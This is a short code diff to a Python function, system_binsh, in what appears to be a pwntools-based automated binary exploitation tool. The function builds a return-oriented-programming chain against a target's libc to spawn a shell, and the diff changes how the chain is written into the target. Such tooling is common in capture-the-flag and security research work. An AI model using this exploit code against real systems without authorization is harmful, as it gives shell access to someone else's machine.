@@ -11,6 +11,7 @@ def system_binsh(state: PwnState) -> PwnState:
     Arguments:
         state: The current `PwnState` with the following set:
 
+            target: What we want to exploit.
             elf: pwntools `ELF` of `state.binary_name`.
             libc: `ELF` of `target`'s libc, with `state.libc.address`
                   already set appropriately.
@@ -29,6 +30,6 @@ def system_binsh(state: PwnState) -> PwnState:
     rop.call(state.vuln_function)  # just in case, to allow for further exploitation
     log.info(rop.dump())
 
-    arutil.call_overwriter(state, rop.chain())
+    state.overwriter(state.target, rop.chain())
 
     return state
